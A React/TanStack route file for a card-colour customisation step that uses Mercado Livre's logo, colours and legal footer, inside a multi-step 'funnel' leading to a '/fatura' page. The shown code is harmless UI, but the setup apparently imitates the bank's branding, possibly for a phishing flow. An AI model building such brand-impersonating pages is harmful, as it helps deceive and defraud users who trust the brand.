import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import mlLogo from "@/assets/mercado-livre-logo.png";
import { FunnelSteps } from "@/components/FunnelSteps";
import cardBg from "@/assets/card-bg.png";

export const Route = createFileRoute("/personalizar")({
  head: () => ({
    meta: [
      { title: "Personalize seu cartão - Mercado Livre" },
      { name: "description", content: "Escolha a cor do seu novo cartão." },
    ],
  }),
  component: Personalizar,
});

const colors = [
  { name: "Azul", value: "#3483FA", gradient: "from-[#F4D147] to-[#2968C8]" },
  { name: "Amarelo", value: "#F4D147", gradient: "from-[#F4D147] to-[#E6CC00]" },
  { name: "Vermelho", value: "#E53935", gradient: "from-[#E53935] to-[#B71C1C]" },
  { name: "Cinza", value: "#9E9E9E", gradient: "from-[#9E9E9E] to-[#616161]" },
  { name: "Preto", value: "#1A1A1A", gradient: "from-[#2D2D2D] to-[#0A0A0A]" },
];

function Personalizar() {
  const navigate = useNavigate();
  const [selected, setSelected] = useState(0);
  const card = colors[selected];
  const isLight = card.value === "#F4D147";
  const textColor = isLight ? "text-gray-800" : "text-white";
  const subTextColor = isLight ? "text-gray-700/70" : "text-white/70";
  const platinumColor = isLight ? "text-gray-700" : "text-white/80";

  // Get name from URL query string
  const nome =
    typeof window !== "undefined"
      ? new URLSearchParams(window.location.search).get("nome")?.toUpperCase() ||
        "NOME DO TITULAR"
      : "NOME DO TITULAR";

  return (
    <div className="min-h-screen bg-white flex flex-col relative overflow-hidden">
      <div className="bg-[#F4D147] w-full py-3 flex justify-center items-center shadow-sm">
        <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
      </div>
      <FunnelSteps current={3} />

      <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
        <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
          <h1 className="text-2xl font-bold text-gray-800 text-center mb-6">
            Personalize o seu cartão
          </h1>

          {/* Credit card preview - 3D rotating (portrait, flat color like reference) */}
          <div className="card-3d-scene mb-6 flex justify-center">
            <div className="card-3d-rotator relative w-[62%] max-w-[260px] aspect-[1/1.586]">
              {/* FRONT */}
              <div
                className="card-3d-face absolute inset-0 rounded-2xl shadow-2xl overflow-hidden"
                style={{
                  backgroundColor: card.value,
                  backgroundImage: `url(${cardBg})`,
                  backgroundSize: "cover",
                  backgroundPosition: "center",
                  backgroundRepeat: "no-repeat",
                  filter: card.value === "#3483FA" ? "none" : "hue-rotate(0deg)",
                }}
              >
                {/* Name overlay */}
                <div className={`absolute left-4 right-4 top-[38%] ${textColor} font-semibold tracking-wider text-[13px] drop-shadow`}>
                  {nome}
                </div>
              </div>

              {/* BACK */}
              <div
                className="card-3d-face card-3d-back absolute inset-0 rounded-2xl shadow-2xl overflow-hidden"
                style={{ backgroundColor: card.value }}
              >
                <div className="absolute inset-0 bg-[radial-gradient(circle_at_top_left,rgba(255,255,255,0.12),transparent_60%)] pointer-events-none" />
                <div className="absolute left-0 right-0 top-6 h-10 bg-black/80" />
                <div className="absolute left-3 right-10 top-24 h-7 bg-white/90 rounded-sm flex items-center justify-end px-2">
                  <div className="text-[10px] text-gray-500 tracking-widest">123</div>
                </div>
                <div className="absolute bottom-3 left-0 right-0 text-center text-[8px] text-white/70 tracking-wider">
                  mercadolivre.com
                </div>
              </div>

            </div>
          </div>



          {/* Color picker */}
          <div className="flex justify-center gap-4 mb-6">
            {colors.map((c, i) => (
              <button
                key={c.name}
                onClick={() => setSelected(i)}
                aria-label={`Cor ${c.name}`}
                className={`w-10 h-10 rounded-full flex items-center justify-center shadow-md transition-all ${
                  selected === i ? "ring-2 ring-offset-2 ring-[#F4D147] scale-110" : "hover:scale-105"
                }`}
                style={{ backgroundColor: c.value }}
              >
                {selected === i && (
                  <svg viewBox="0 0 24 24" className={`w-5 h-5 ${c.value === "#F4D147" ? "text-gray-800" : "text-white"}`} fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                    <polyline points="20 6 9 17 4 12" />
                  </svg>
                )}
              </button>
            ))}
          </div>

          <button
            onClick={() => navigate({ to: "/fatura" })}
            className="w-full bg-[#F4D147] hover:bg-[#E5C238] text-gray-900 text-lg font-semibold py-4 rounded-md shadow-md transition-all"
          >
            Continuar
          </button>
        </div>
      </main>

      <footer className="text-center text-xs text-gray-500 py-6 relative z-10">
        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
        <p className="mt-1">
          CNPJ: 10.573.521/0001-91 ·{" "}
          <a href="#" className="text-gray-900">Termos e condições</a> ·{" "}
          <a href="#" className="text-gray-900">Privacidade</a>
        </p>
      </footer>
    </div>
  );
}
